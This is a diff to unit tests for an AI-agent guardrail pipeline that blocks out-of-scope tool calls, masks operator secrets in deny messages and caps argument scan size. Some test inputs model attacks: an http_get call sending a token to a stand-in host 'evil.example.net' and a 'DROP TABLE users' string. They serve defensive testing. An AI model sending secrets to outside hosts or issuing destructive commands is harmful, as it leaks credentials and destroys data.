@@ -18,6 +18,7 @@ from langchain_core.messages import ToolMessage
 from langgraph.prebuilt.tool_node import ToolCallRequest
 
 from swarmy.events.models import GuardrailBlockedPayload
+from swarmy.guardrails.invariants import InvariantLayer, session_invariants
 from swarmy.guardrails.models import (
     BlockedFeedback,
     GuardrailLayer,
@@ -27,15 +28,19 @@ from swarmy.guardrails.models import (
     Verdict,
 )
 from swarmy.guardrails.pipeline import (
+    MAX_ARGS_SCAN_BYTES,
     GuardrailMiddleware,
     GuardrailPipeline,
     blocked_feedback_text,
     tool_args_digest,
 )
+from swarmy.tools.limits import ResourceLimiter, ResourceLimits
 from swarmy.tools.projector import ContextProjector
+from swarmy.tools.scope import ScopeEntries, ScopeRegistry
 
 if TYPE_CHECKING:
-    from collections.abc import Awaitable, Callable
+    import asyncio
+    from collections.abc import Awaitable, Callable, Mapping
 
     from tests.unit.guardrails.conftest import RecordingSink
 
@@ -381,3 +386,192 @@ def test_body_size_counts_nested_structures() -> None:
 def test_guardrail_layer_alias_matches_feedback_values() -> None:
     """The layer alias is the exact arch §5.1 vocabulary."""
     assert GuardrailLayer.__args__ == ("invariant", "engine", "module", "judge")  # type: ignore[attr-defined]
+
+
+# ---------------------------------------------------------------------------
+# Issue #39 — deny feedback and the journaled `reason` via the projector.
+# ---------------------------------------------------------------------------
+
+#: Allowlist that denies every host except the fictional target, so the
+#: layer-1 scope invariant quotes the raw (secret-carrying) URL in its deny
+#: reason — exactly the production contour of Issue #39.
+_SCOPE = ScopeRegistry(ScopeEntries(domains=["target.example.com"], ports=[443], schemes=["https"]))
+
+
+def _scope_deny_pipeline(
+    projector: ContextProjector,
+    blocked_sink: Callable[[GuardrailBlockedPayload], Awaitable[None]] | None = None,
+) -> GuardrailPipeline:
+    """Pipeline whose layer-1 scope deny quotes the tool-argument URL."""
+    limiter = ResourceLimiter(
+        ResourceLimits(
+            rate_limit=5,
+            max_concurrent_requests=8,
+            max_body_bytes=5_242_880,
+            max_redirect_depth=5,
+            total_request_budget=5000,
+            connect_timeout_s=10,
+            read_timeout_s=30,
+        )
+    )
+    return GuardrailPipeline(
+        invariants=InvariantLayer(session_invariants(_SCOPE, limiter)),
+        engine_rules_enabled=False,
+        projector=projector,
+        blocked_sink=blocked_sink,
+    )
+
+
+async def test_sink_reason_is_projected_like_the_digest() -> None:
+    """Issue #39(c): the journaled `reason` is projected, never raw.
+
+    The scope invariant quotes the raw tool-argument URL; with an operator
+    secret inside that URL, both payload fields of the journal row must
+    carry the masked reference (arch §5.5, §12.3).
+    """
+    captured: list[GuardrailBlockedPayload] = []
+
+    async def sink(payload: GuardrailBlockedPayload) -> None:
+        captured.append(payload)
+
+    projector = ContextProjector(secrets={"api_key": "s3cr3t-value"}, mark_untrusted=False)
+    pipeline = _scope_deny_pipeline(projector, sink)
+    result = await pipeline.check_and_report(
+        "http_get", {"url": "https://evil.example.net/login?token=s3cr3t-value"}
+    )
+
+    assert result.verdict is Verdict.BLOCK
+    assert result.feedback is not None
+    assert "s3cr3t-value" in result.feedback.reason  # the raw reason quotes the URL
+    assert len(captured) == 1
+    assert "s3cr3t-value" not in captured[0].reason
+    assert "<masked:api_key>" in captured[0].reason
+    assert "<masked:api_key>" in captured[0].tool_args_digest
+
+
+async def test_middleware_projects_deny_feedback_with_session_projector() -> None:
+    """Issue #39(a): the deny ToolMessage passes the session projector.
+
+    The deny short-circuits the handler, so the inner ProjectorMiddleware
+    never sees the feedback; GuardrailMiddleware projects it itself — the
+    operator secret inside the quoted URL reaches the agent masked, while
+    the rule id / layer stay readable.
+    """
+    projector = ContextProjector(secrets={"api_key": "s3cr3t-value"})
+    middleware = GuardrailMiddleware(_scope_deny_pipeline(projector), projector=projector)
+    spy = ToolSpy()
+
+    outcome = await middleware.awrap_tool_call(
+        _make_request("http_get", {"url": "https://evil.example.net/?token=s3cr3t-value"}), spy
+    )
+
+    assert spy.calls == []  # deny supremacy: the call was not executed
+    assert isinstance(outcome, ToolMessage)
+    content = str(outcome.content)
+    assert "s3cr3t-value" not in content
+    assert "<masked:api_key>" in content
+    assert "invariant:scope" in content  # rule id survives projection
+
+
+# ---------------------------------------------------------------------------
+# F-10 — scan-size cap over unbounded LLM-authored argument trees.
+# ---------------------------------------------------------------------------
+
+
+async def test_oversized_args_denied_by_scan_cap_before_rule_scans() -> None:
+    """F-10: args above MAX_ARGS_SCAN_BYTES are denied without rule scans.
+
+    No rule regex runs over the multi-hundred-KB argument tree (ReDoS
+    protection); the synthetic invariant feedback denies the call, and the
+    sink still journals the violation with a budgeted digest — journal-first
+    semantics of any deterministic deny.
+    """
+    captured: list[GuardrailBlockedPayload] = []
+
+    async def sink(payload: GuardrailBlockedPayload) -> None:
+        captured.append(payload)
+
+    pipeline = GuardrailPipeline(blocked_sink=sink)
+    huge = "x" * (MAX_ARGS_SCAN_BYTES + 1024)
+
+    result = await pipeline.check_and_report("memory_add_note", {"text": huge})
+
+    assert result.verdict is Verdict.BLOCK
+    assert result.feedback is not None
+    assert result.feedback.rule_id == "invariant:args-scan-size-cap"
+    assert result.feedback.layer == "invariant"
+    assert "scan budget" in result.feedback.reason
+    assert len(captured) == 1
+    assert captured[0].rule_id == "invariant:args-scan-size-cap"
+    assert "[truncated" in captured[0].tool_args_digest  # digest still budgeted
+
+
+def test_args_within_scan_cap_evaluate_normally() -> None:
+    """The cap is a ceiling, not a deny-all: sub-cap args are rule-judged."""
+    pipeline = _pipeline(_MODULE_DROP_TABLE)
+    result = pipeline.evaluate("memory_add_note", {"text": "please DROP TABLE users"})
+    assert result.verdict is Verdict.BLOCK
+    assert result.feedback is not None
+    assert result.feedback.rule_id == "module-guard-drop-table"
+
+
+class _PostCallSpyBand:
+    """A judge-band double recording postcall invocations (#54 ↔ F-19)."""
+
+    def __init__(self) -> None:
+        self.postcalls: list[tuple[str, str, str]] = []
+        self.preconsulted = 0
+
+    def gate_for(self, tool_name: str) -> tuple[Verdict, BlockedFeedback | None] | None:
+        return None
+
+    async def precall(
+        self, tool_name: str, tool_args: Mapping[str, object], args_digest: str
+    ) -> tuple[Verdict, BlockedFeedback | None] | None:
+        self.preconsulted += 1
+        return None
+
+    def postcall(
+        self, tool_name: str, result_text: str, args_digest: str
+    ) -> asyncio.Task[None] | None:
+        self.postcalls.append((tool_name, result_text, args_digest))
+        return None
+
+
+async def test_middleware_spawns_postcall_on_executed_result() -> None:
+    """#54 ↔ F-19: the executed result reaches the band's post-call screen.
+
+    The screen runs **after** the handler, off the execution path: the call's
+    outcome is untouched, and the band receives the §6.8-projected digest of
+    the executed arguments (Issue #49). A denied call never reaches it.
+    """
+    band = _PostCallSpyBand()
+    pipeline = GuardrailPipeline(judge_band=band)  # type: ignore[arg-type]
+    middleware = GuardrailMiddleware(pipeline)
+
+    async def _tool_handler(request: object) -> ToolMessage:
+        return ToolMessage(content="result with instructions", tool_call_id="call-1")
+
+    outcome = await middleware.awrap_tool_call(
+        _make_request("http_get", {"url": "http://t.example.com/"}), _tool_handler
+    )
+    assert isinstance(outcome, ToolMessage)  # the outcome is untouched
+    assert len(band.postcalls) == 1
+    screen_tool, screen_text, screen_digest = band.postcalls[0]
+    assert screen_tool == "http_get"
+    assert screen_text == "result with instructions"
+    assert '"url": "http://t.example.com/"' in screen_digest  # Issue #49 digest
+    assert band.preconsulted == 1
+
+
+async def test_middleware_denied_call_skips_postcall() -> None:
+    """A blocked call never executed — there is no result to post-screen."""
+    band = _PostCallSpyBand()
+    pipeline = GuardrailPipeline(judge_band=band)  # type: ignore[arg-type]
+    middleware = GuardrailMiddleware(pipeline)
+    spy = ToolSpy()
+    outcome = await middleware.awrap_tool_call(
+        _make_request("raw_fetch", {"url": "http://t.example.com/"}), spy
+    )
+    assert isinstance(outcome, ToolMessage)
+    assert band.postcalls == []
